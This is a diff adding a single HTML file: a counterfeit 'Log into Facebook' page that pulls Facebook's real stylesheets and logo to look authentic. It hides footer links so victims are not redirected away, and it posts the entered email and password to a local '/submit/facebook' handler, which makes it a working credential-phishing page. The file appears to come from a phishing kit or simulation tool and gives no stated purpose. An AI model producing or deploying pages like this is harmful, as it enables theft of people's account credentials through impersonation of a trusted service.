@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Log into Facebook</title>
+<link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yt/l/0,cross/JKaz7mlsNWj.css" crossorigin="anonymous">
+<link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yx/l/0,cross/4JYV2uU2uqw.css" crossorigin="anonymous">
+<link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/y1/l/0,cross/2nrv04yYtCI.css" crossorigin="anonymous">
+<style>
+/* Hide Facebook footer links to avoid redirecting away */
+#pageFooter, ._95ke, ._8opy { display: none !important; }
+.container {
+  max-width: 400px;
+  width: 90%;
+  margin: 50px auto;
+  padding: 20px;
+  background: white;
+  border-radius: 8px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+  text-align: center;
+}
+</style>
+</head>
+<body>
+<div class="container">
+<img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" style="margin-bottom:20px;">
+<h2 style="margin-bottom:20px;">Log Into Facebook</h2>
+<form method="POST" action="/submit/facebook">
+<input type="text" name="email" placeholder="Email or phone number" required autofocus autocomplete="username" aria-label="Email or phone number" style="width:90%;max-width:350px;display:block;margin:10px auto;box-sizing:border-box;">
+<input type="password" name="pass" placeholder="Password" required autocomplete="current-password" aria-label="Password" style="width:90%;max-width:350px;display:block;margin:10px auto;box-sizing:border-box;">
+<button type="submit" style="width:90%;max-width:350px;margin:10px auto;box-sizing:border-box;">Log In</button>
+<div style="margin-top:15px;">
+<a href="#">Forgot account?</a> · <a href="#">Sign up for Facebook</a>
+</div>
+</form>
+<div style="background:#f7f7f7; padding:10px; font-size:12px; color:#555; margin-top:15px;">
+By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>. This site uses cookies to improve your experience.
+</div>
+<div class="footer" style="margin-top:20px; font-size:12px; color:#777;">
+Facebook © 2025
+</div>
+</div>
+</body>
+</html>
